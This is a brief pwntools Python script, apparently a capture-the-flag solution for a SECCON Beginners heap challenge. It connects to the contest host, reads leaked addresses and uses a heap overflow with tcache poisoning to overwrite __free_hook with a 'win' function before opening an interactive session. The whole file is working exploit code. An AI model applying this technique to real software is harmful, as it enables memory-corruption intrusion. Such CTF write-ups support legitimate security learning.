from pwn import *
from time import sleep

p = remote("bh.quals.beginners.seccon.jp", "9002")

p.recvuntil("<__free_hook>: ")
__free_hook = int( p.recvline(), 16)
p.recvuntil("<win>: ")
win = int( p.recvline(), 16 )

info("__free_hook: 0x%x, win: 0x%x", __free_hook, win )

#malloc B and free
p.sendlineafter("\n> ", "2" )
sleep( 0.5 )
p.sendline("bbbb")
p.sendlineafter("\n> ", "3" )


#overwrite B
p.sendlineafter("\n> ", "1" )
sleep( 0.5 )
p.sendline( b"A"*0x18 + p64( 0x30 ) + p64(__free_hook) )

#tcache pull B-chank
p.sendlineafter("\n> ", "2" )
sleep( 0.5 )
p.sendline("BBBB")
p.sendlineafter("\n> ", "3" )

#overwrite __free_hook to win funciton
p.sendlineafter("\n>", "2" )
sleep( 0.5 )
p.sendline( p64( win ) )

p.interactive()
